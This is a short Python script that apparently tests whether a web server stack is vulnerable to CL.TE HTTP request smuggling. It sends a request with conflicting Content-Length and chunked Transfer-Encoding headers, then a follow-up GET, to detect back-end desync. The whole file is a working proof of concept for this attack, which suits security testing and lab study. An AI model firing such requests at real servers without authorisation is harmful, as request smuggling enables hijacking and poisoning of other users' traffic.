#!/usr/bin/env python3
"""
CL.TE smuggling test (PortSwigger basic CL.TE pattern).

Front-end uses Content-Length, back-end honors Transfer-Encoding: chunked.
The front-end forwards the *whole* body (CL=13). The back-end reads the
chunked body, sees the "0\r\n\r\n" terminator after 5 bytes, and treats
the trailing "SMUGGLED" as the start of the *next* request on the
keep-alive socket.

Run two requests on one connection:
  1) the smuggling request
  2) a benign GET — its prefix should now be "SMUGGLEDGET /api/echo.ashx ..."
     and the back-end will reply with a 400/404, proving desync.
"""
import socket, sys

HOST, PORT = (sys.argv[1], int(sys.argv[2])) if len(sys.argv) > 2 else ("127.0.0.1", 8080)

smuggle = (
    "POST /api/echo.ashx HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 13\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "SMUGGLED"
)
follow = (
    f"GET /api/echo.ashx HTTP/1.1\r\nHost: {HOST}\r\nConnection: close\r\n\r\n"
)

s = socket.create_connection((HOST, PORT), timeout=5)
s.sendall(smuggle.encode() + follow.encode())
data = b""
try:
    while True:
        chunk = s.recv(4096)
        if not chunk: break
        data += chunk
except socket.timeout:
    pass
s.close()
print(data.decode("latin1"))
print("\n[+] If the SECOND response shows method=SMUGGLEDGET or a 400/404, the back-end desynced (CL.TE).")
